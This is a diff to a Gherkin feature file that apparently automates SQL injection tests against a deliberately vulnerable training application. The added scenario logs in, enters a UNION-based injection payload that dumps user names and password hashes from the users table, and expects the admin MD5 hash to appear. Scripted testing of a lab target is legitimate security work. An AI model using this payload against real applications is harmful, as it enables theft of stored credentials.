@@ -33,3 +33,9 @@ Feature: SQL injection Execution
     | users |
     | ALL_PLUGINS |
     | APPLICABLE_ROLES |
+
+    Scenario: Attacker perform SQL injection and gain access to the users data and password hash
+      Given user login the application with 'admin' and 'password'
+      And go to 'vulnerabilities/sqli/' page
+      When user enters "%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #" and clicks 'Submit'
+      Then user see the 'admin' user data and password md5 hash
